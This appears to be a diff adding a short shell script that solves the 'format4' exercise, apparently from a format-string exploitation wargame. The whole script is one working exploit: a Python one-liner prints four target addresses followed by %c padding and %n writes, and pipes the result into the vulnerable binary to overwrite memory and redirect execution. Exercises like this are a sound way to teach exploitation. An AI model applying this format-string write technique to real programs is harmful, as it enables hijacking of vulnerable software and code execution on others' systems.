@@ -1,0 +1,3 @@
+#!/bin/sh
+
+python -c "print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08%164c%4\$n%208c%5\$n%128c%6\$n%4c%7\$n'" | ./format4
